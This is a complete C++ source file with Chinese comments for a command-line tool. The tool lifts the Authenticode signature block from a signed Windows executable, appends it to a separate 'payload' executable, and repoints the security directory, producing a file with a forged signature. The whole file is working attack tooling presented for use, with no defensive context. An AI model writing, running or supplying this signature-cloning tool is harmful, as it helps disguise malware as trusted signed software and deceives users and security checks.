#include <fstream>
#include <windows.h>
#pragma warning(disable : 4996)

BYTE* MapFileToMemory(LPCSTR filename, LONGLONG& filelen)
{
	FILE* fileptr;
	BYTE* buffer;

	fileptr = fopen(filename, "rb"); // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);	 // Jump to the end of the file
	filelen = ftell(fileptr);		 // Get the current byte offset in the file
	rewind(fileptr);				 // Jump back to the beginning of the file

	buffer = (BYTE*)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr);					   // Read in the entire file
	fclose(fileptr);									   // Close the file
	return buffer;
}

BYTE* rippedCert(const char* fromWhere, LONGLONG& certSize)
{
	LONGLONG signedPeDataLen = 0;
	BYTE* signedPeData = MapFileToMemory(fromWhere, signedPeDataLen); // 将二进制文件读到内存中

	auto ntHdr = PIMAGE_NT_HEADERS(&signedPeData[PIMAGE_DOS_HEADER(signedPeData)->e_lfanew]); // NT Header
	auto certInfo = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; // Security Directoty 
	certSize = certInfo.Size;

	BYTE* certData = new BYTE[certInfo.Size];
	memcpy(certData, &signedPeData[certInfo.VirtualAddress], certInfo.Size); // 拷贝签名数据
	return certData;
}

int main(int argc, char** argv)
{
	if (argc < 4)
	{
		auto fileName = strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0];
		printf("usage: %s [path/to/signed_pe] [path/to/payload] [path/to/output]\n", fileName);
		return 0;
	}
	// 1. 获取已签名文件的签名信息
	LONGLONG certSize;
	BYTE* certData = rippedCert(argv[1], certSize);

	// 2. 将未签名的二进制文件读入内存中
	LONGLONG payloadSize = 0;
	BYTE* payloadPeData = MapFileToMemory(argv[2], payloadSize); 

	// 3. 将签名信息拷贝至PE文见末尾
	BYTE* finalPeData = new BYTE[payloadSize + certSize];
	memcpy(finalPeData, payloadPeData, payloadSize);

	// 4. 更新Security Directoty，指向我们新增的签名块处
	auto ntHdr = PIMAGE_NT_HEADERS(&finalPeData[PIMAGE_DOS_HEADER(finalPeData)->e_lfanew]); // NT Header
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
	memcpy(&finalPeData[payloadSize], certData, certSize);

	// 5. 将伪造签名后的文件写入本地
	FILE* fp = fopen(argv[3], "wb");
	fwrite(finalPeData, payloadSize + certSize, 1, fp);
	puts("done.");

	return 0;
}